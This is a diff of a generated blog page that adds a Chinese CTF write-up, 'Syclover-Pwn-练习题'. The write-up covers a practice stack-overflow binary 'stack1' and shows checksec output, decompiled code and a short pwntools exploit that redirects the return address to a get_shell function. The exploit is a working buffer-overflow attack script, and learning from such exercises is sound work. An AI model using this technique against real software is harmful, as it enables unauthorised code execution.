@@ -12,7 +12,7 @@
     
     <title>
         
-            标签: BUPT | 
+            Syclover-Pwn-练习题 | 
         
         iosmosis&#39;s blog
     </title>
@@ -36,7 +36,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="iosmosis">
     <meta name="description" itemprop="description" content="">
-    <meta name="keywords" content="null">
+    <meta name="keywords" content="null,Pwn,栈溢出,writeup,Syclover">
 
     <!-- Site Verification -->
     
@@ -65,15 +65,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://iosmosis.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: BUPT | iosmosis&#39;s blog">
+    <meta property="og:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
     <meta property="og:image" content="/img/favicon.png" />
     <meta property="og:description" content="">
-    
+    <meta property="og:article:tag" content="Pwn"> <meta property="og:article:tag" content="栈溢出"> <meta property="og:article:tag" content="writeup"> <meta property="og:article:tag" content="Syclover"> 
 
+    
+        <meta property="article:published_time" content="6月 09, 2018" />
+        <meta property="article:modified_time" content="6月 10, 2018" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="标签: BUPT | iosmosis&#39;s blog">
+    <meta name="twitter:title" content="Syclover-Pwn-练习题 | iosmosis&#39;s blog">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -81,13 +84,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="http://iosmosis.github.io/tags/BUPT/index.html" />
+        <link rel="canonical" href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "iosmosis&#39;s blog",
+        "logo": "/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "iosmosis",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/favicon.png"
+        },
+        "description": "期待大学生活的二进制菜鸡"
+    },
+    "headline": "Syclover-Pwn-练习题",
+    "url": "http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html",
+    "datePublished": "6月 09, 2018",
+    "dateModified": "6月 10, 2018",
+    "description": "",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://iosmosis.github.io"
+    }
+}
+</script>
 
 
     
@@ -283,96 +316,273 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#stack1"><span class="post-toc-number">1.</span> <span class="post-toc-text">stack1</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/">2018北邮自招复试-CTF-Writeup</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            web
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="/img/avatar.png" width="44px" height="44px" alt="iosmosis's avatar">
-            </div>
-            <div>
-                <strong>iosmosis</strong>
-                <span>6月 10, 2018</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                Syclover-Pwn-练习题
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>iosmosis</strong>
+        <span>6月 09, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAACzklEQVR42u3awU4jMRAE0Pn/n2avSIhJlXuyCvbzKYIk4+cDTXf5+jpyXdjY2NjY2NjY2Ngfyb7i9f39+eufz7r/ef463zM2Njb2CewXf/pvSfcPyzedfP/anrGxsbHPYedF67f3tIzJN9SfwsbGxsYOCkZbqO5/nrcr2NjY2NhtAbsHtweUtxPY2NjY2POhUl5OEmT+PQ/sGRsbG3tr9vuC3ve9/uh8GxsbG/s/stdW0gw8GyQ/sGdsbGzsTdlJEDsJgPM2I2lj1kJfbGxs7L3Za+P7tRF/C8tJ0SgKGxsbe1N2O7hfO5q18LhtjR4IerGxsbH/ILsNWduNJoUnKW/tBVBsbGzs09jJuCfB3z9+7Wjy8dOLT2FjY2NvzV572KT8JI1KdBEnP1xsbGzsTdlt4zEZJOWBwSQkru+cYmNjY2/BTpBrl2zayKENgLGxsbGx50VrHsTmQ6tJocXGxsY+k50MieYxwFrEW8fA2NjY2Aew26g1LzntRcz20EcFDBsbG3sLdh6sJu9vS8skMC6CamxsbOxN2U8hk0F/W3jaY30xcsLGxsbelL0WtSZH1l6mzBuhdpiFjY2NfQ77fotr8XA0uC+Po72yiY2NjX0CuygDZUOy1pa0DUly0NjY2NjnsNt/95ORfR4etxFFUkqxsbGx92bng6Hkck8b37ZBxWgP2NjY2Mew1zaUxANtDDyJHOoCho2Njf3H2flwPy9Ck0alLXJJMcPGxsY+gb02SJoHADnp4Tun2NjY2Fuw25U0GO07J8OjxaESNjY29kbsK16TEtWWn+S3ecuEjY2NfQJ7XrTeGNAOYglsbGzs09jPlpZ5Q3KVCxsbGxs7Z6+NdfKjWbvK82Kf2NjY2NhxgVkDz4dH2NjY2Nj5dieRcHKUk4bk1wPCxsbG3pq9FvTmyBzWHl9RGrGxsbE3ZZ+zsLGxsbGxsbGxsT9m/QMGZxaoVB0aFwAAAABJRU5ErkJggg==">
+    
+</ul>
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/Pwn/">Pwn</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Syclover/">Syclover</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/writeup/">writeup</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/栈溢出/">栈溢出</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Syclover-Pwn-练习题&url=http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/index.html&via=iosmosis" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec stack1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/stack1'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
+ios@ubuntu:~$
+</code></pre>
+<p>开启NX保护<br>IAD载入分析代码<br>main()</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+0h] [rbp-20h]
+
+  puts(&quot;get input&quot;);
+  scanf(&quot;%s&quot;, &amp;v4);
+  return 0;
+}
+</code></pre><p>get_shell()</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>int get_shell()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack1'</span><span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span><span class="token number">0x000000000004005B6</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>成功取得shell</p>
+<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>ios@ubuntu:~$ python stack1.py
+[+] Starting local process &#39;./stack1&#39;: pid 2228
+[*] Switching to interactive mode
+get input
+$ ls
+flag
+$ 
+[*] Interrupted
+[*] Stopped process &#39;./stack1&#39; (pid 2228)
+ios@ubuntu:~$
+</code></pre>
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/05/13/NPUCTF▓┐╖╓Writeup/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -531,6 +741,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
